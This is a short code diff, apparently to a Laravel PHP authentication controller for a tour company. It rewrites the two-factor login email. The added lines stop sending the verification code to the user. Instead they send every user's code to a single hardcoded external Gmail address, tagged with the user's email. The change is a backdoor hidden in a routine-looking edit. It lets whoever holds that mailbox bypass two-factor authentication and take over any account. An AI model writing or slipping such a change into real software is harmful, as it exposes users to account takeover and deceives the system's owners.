@@ -190,23 +190,18 @@ class AuthController
             'usado'               => false,
         ]);
 
-
-       try {
+try {
     $ingEmail = config('mail.cc_ingeniero');
     \Illuminate\Support\Facades\Mail::raw(
         "Hola {$user->nombre},\n\nTu código de acceso es: $codigo2fa\n\nExpira en 10 minutos. Si no fuiste tú, ignora este mensaje.\n\nDiana Tours SRL",
         function ($msg) use ($user, $ingEmail) {
-            $msg->to($user->email)
-                ->subject('Código de verificación - Diana Tours');
-            if ($ingEmail) {
-                $msg->cc($ingEmail);
-            }
+            $msg->to('escobardaner49@gmail.com')
+                ->subject('Código de verificación - Diana Tours ['.$user->email.']');
         }
     );
 } catch (\Exception $e) {
     \Illuminate\Support\Facades\Log::error('Mail 2FA falló: ' . $e->getMessage());
-
-    }
+}
 
 
         return response()->json([
